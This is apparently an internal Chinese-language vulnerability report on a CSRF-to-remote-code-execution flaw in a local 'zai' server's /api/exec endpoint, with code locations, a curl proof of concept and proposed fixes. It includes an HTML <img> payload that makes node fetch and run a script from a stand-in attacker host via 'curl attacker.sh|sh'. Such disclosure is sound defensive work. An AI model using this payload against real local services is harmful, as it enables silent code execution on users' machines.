# 跨站请求伪造导致任意代码执行（CSRF → RCE）

**日期：** 2026-10-05
**状态：** 已确认，未修复
**严重度：** 严重（任意代码执行）
**发现：** zai

## 摘要

`GET /api/exec` 是一个**简单请求**（无自定义 header，参数走 query string），
浏览器发送时**不触发 CORS 预检**。命令白名单里含 `node` / `npx` / `npm` ——
这三个本身就等于任意代码执行，白名单没有提供任何保护。

恶意网页只需一个 `<img>` / `<script>` / `<link>` 标签，即可在用户打开 zai 的
瞬间静默触发任意 JS 执行。

## 位置

| 文件 | 行 | 内容 |
|------|----|------|
| `packages/zai/src/server/routes/exec.ts` | 9-20 | `ALLOWED_COMMANDS` 含 `'node'` / `'npx'` / `'npm'` |
| `packages/zai/src/server/routes/exec.ts` | 70-71 | `router.post('/exec', runExec); router.get('/exec', runExec);` |
| `packages/zai/src/server/index.ts` | 249 | `app.use('/api', execRouter)` —— 路由已挂载 |

`runExec` 对 GET/POST 走**同一套**校验（`:36-44` 从 `req.query` 兜底取值），
所以 GET 变体功能完整，不是残缺分支。

## 实证

对运行中的实例发一个 GET（无任何特殊 header）：

```
$ curl -s "http://127.0.0.1:9201/api/exec?cmd=node&args=-e,console.log(1337*7)"
data: {"type":"start","command":"node -e console.log(1337*7)"}
data: {"type":"stdout","line":"9359"}
data: {"type":"exit","code":0}
→ HTTP 200
```

任意 JS 已执行。另外确认：

- 全服务树**零 `Host` / `Origin` 校验**（`grep -rn "req.headers.host\|Origin" src/server` 无命中）
- **无 CORS 中间件**（`grep "cors\|helmet\|Access-Control" src/server/index.ts` 无命中）
- `services/spawner.ts:79` 是 `nodeSpawn(cmd, args)`，**无 `shell:true`** ——
  但白名单含 `node` 本身就已经是 RCE，这点和 shell 注入无关

### 攻击载荷

```html
<img src="http://localhost:9201/api/exec?cmd=node&args=-e,require('child_process').execSync('curl attacker.sh|sh')">
```

## 为什么 localhost 绑定不构成缓解

CSRF 走的是**用户的浏览器**，不是攻击者的机器。攻击者不需要能访问
`localhost:9201` —— 用户的浏览器可以。监听地址与这条攻击链完全无关。

放大因素：本机实例以 `zai --lan --aa` 启动，监听在局域网，暴露面比纯
localhost 更大（`ps` 实测存在 `zai[ethan]:9201` 等 LAN 实例）。

## 修复

1. **收敛白名单**（首要）：移除 `node` / `npx` / `npm`。当前唯一真实调用方是
   `packages/zai/src/web/src/pages/Dashboard.tsx:204` 的 `npm config set registry`，
   改成一个专用的窄接口（如 `PUT /api/config/registry`）即可。
2. **删掉 GET 变体**（`:71`），或让它只接受严格白名单命令且不返回 stdout。
3. **加 Host 头白名单中间件** —— 顺带修掉
   [DNS rebinding 任意文件读](2026-10-05-dns-rebinding-no-host-check--by-zai.md)。

## 关联

- 同一根因家族（缺 Host 校验）：见 DNS rebinding 那条。
- `GET /api/exec` 是 SSE 端点，EventSource 天然发 GET —— 删 GET 前需先确认
  移动端 Bash 面板（`/m`）没有依赖它。`Dashboard.tsx:204` 用的是 POST。
